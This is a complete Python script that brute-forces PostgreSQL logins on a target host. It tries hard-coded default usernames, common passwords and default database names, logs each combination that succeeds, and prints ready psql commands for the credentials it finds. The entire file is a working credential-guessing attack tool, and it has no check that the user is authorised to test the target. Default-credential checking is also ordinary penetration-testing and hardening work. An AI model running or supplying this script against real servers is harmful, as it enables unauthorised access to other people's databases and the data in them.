import psycopg2
from psycopg2 import OperationalError
import argparse
from colorama import Fore, Style, init

# Initialize colorama for color coding
init(autoreset=True)

# Payloads for testing usernames, passwords, and databases
usernames = ["postgres", "admin"]
passwords = ["password", "secret", "admin", "postgres"]
databases = ["postgres", "template1", "template0", "test", "db"]  # Common default database names

# Store successful login attempts
successful_attempts = []

def test_postgres_login(username, password, host, port, db_name=None):
    try:
        # If database name is provided, attempt to connect with it, otherwise connect without specifying a database
        if db_name:
            connection = psycopg2.connect(
                host=host,
                port=port,
                database=db_name,
                user=username,
                password=password
            )
            print(f"{Fore.GREEN + Style.BRIGHT}[SUCCESS] Login successful for Username: '{username}', Password: '{password}', Database: '{db_name}'{Style.RESET_ALL}")
            successful_attempts.append({
                "username": username,
                "password": password,
                "database": db_name,
                "host": host,
                "port": port
            })
        else:
            connection = psycopg2.connect(
                host=host,
                port=port,
                user=username,
                password=password
            )
            print(f"{Fore.GREEN + Style.BRIGHT}[SUCCESS] Login successful for Username: '{username}', Password: '{password}' (no database specified){Style.RESET_ALL}")
            successful_attempts.append({
                "username": username,
                "password": password,
                "database": "None",
                "host": host,
                "port": port
            })
        connection.close()
    except OperationalError as error:
        # Handle different failure types
        if "password authentication failed" in str(error):
            if db_name:
                print(f"{Fore.RED}[FAILED] Invalid login for Username: '{username}', Password: '{password}', Database: '{db_name}'{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[FAILED] Invalid login for Username: '{username}', Password: '{password}' (no database specified){Style.RESET_ALL}")
        elif "FATAL" in str(error):
            print(f"{Fore.RED}[FAILED] Connection error for Username: '{username}', Password: '{password}', Database: '{db_name or 'None'}'{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[ERROR] An unexpected error occurred: {error}{Style.RESET_ALL}")

def show_successful_logins():
    if successful_attempts:
        print(f"\n{Fore.GREEN + Style.BRIGHT}Summary of Successful Logins:{Style.RESET_ALL}")
        for attempt in successful_attempts:
            print(f"{Fore.CYAN}Username: {attempt['username']}, Password: {attempt['password']}, Database: {attempt['database']}, Host: {attempt['host']}, Port: {attempt['port']}")
            db_info = f" --dbname={attempt['database']}" if attempt['database'] != "None" else ""
            print(f"{Fore.YELLOW}Command to test manually: psql --host={attempt['host']} --port={attempt['port']} --username={attempt['username']} {db_info}{Style.RESET_ALL}\n")

def main():
    # Parse command-line arguments for IP and port
    parser = argparse.ArgumentParser(description="PostgreSQL login brute force testing script")
    parser.add_argument("--host", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=5432, help="Target port (default: 5432)")
    args = parser.parse_args()

    host = args.host
    port = args.port

    print(f"[*] Starting login tests on {host}:{port}...")

    # Test each combination with and without database
    for db_name in databases + [None]:  # Include None to test without a database
        for username in usernames:
            for password in passwords:
                if db_name:
                    print(f"[*] Testing Username: '{username}', Password: '{password}', Database: '{db_name}'")
                else:
                    print(f"[*] Testing Username: '{username}', Password: '{password}' (no database specified)")
                test_postgres_login(username, password, host, port, db_name)

    # Show summary of successful login attempts
    show_successful_logins()

if __name__ == "__main__":
    main()
